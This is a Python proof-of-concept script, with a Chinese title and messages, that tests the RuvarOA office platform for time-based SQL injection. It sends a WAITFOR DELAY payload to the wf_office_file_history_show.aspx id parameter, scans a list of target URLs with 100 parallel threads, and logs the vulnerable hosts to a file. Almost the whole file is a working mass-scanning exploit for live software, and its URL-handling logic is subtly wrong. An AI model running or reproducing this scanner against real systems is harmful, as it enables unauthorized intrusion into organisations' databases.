#RuvarOA协同办公平台 wf_office_file_history_show SQL注入


# https://fifeleisure.org/
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    test = """
 
  ____   ___  _       _        _           _   _             
 / ___| / _ \| |     (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___  | | | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                            |__/                             
                                                                    version:1.0.0
                                                                    author:laow                                        
"""
    print(test)

def main():
    banner() 
    parser = argparse.ArgumentParser(description="RuvarOA_sleep_sql_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = i + 'http://'
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27-- '
    url = target+url_payload
    headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Encoding":"gzip, deflate",
		"Accept-Language":"zh-CN,zh;q=0.9",
		"sec-ch-ua-platform":'"Windows"',
		"sec-ch-ua":'"Google Chrome";v="115", "Chromium";v="115", "Not=A?Brand";v="24"',
		"sec-ch-ua-mobile":"?0",
		"Connection":"close"
	}
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=headers,verify=False)
        time = str(res.elapsed.total_seconds())[0]
        if res.status_code == 200:
            # res2 = requests.get(url=url,headers=headers,verify=False)
            # res3 = requests.get(url=url,headers=headers)
            # time1 = res2.elapsed.total_seconds()
            # time2 = res3.elapsed.total_seconds()
            if '4' < time <'6':
                print(f"{GREEN}[+] {url} 存在sql延时注入漏洞！{RESET}")
                with open('result.txt','a') as f:
                    f.write(target+'\n')
            else:
                print('漏洞不存在!!')
    except Exception:
        pass
        

if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()
